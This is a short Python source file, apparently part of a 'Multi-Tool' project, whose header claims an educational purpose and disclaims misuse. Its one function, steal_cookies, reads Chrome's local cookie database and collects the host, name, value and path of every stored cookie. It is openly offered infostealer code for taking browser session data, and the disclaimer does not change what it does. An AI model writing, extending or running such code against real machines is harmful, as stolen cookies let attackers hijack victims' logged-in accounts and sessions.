# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


def steal_cookies():
    """Steal browser cookies"""
    import os
    import sqlite3
    import json
    
    cookies = []
    
    # Chrome cookies
    chrome_cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies")
    
    if os.path.exists(chrome_cookies_path):
        try:
            conn = sqlite3.connect(chrome_cookies_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, path FROM cookies")
            
            for row in cursor.fetchall():
                host, name, value, path = row
                cookies.append({
                    "host": host,
                    "name": name,
                    "value": value[:50] + "..." if len(value) > 50 else value,
                    "path": path
                })
            
            conn.close()
        except:
            pass
    
    return cookies
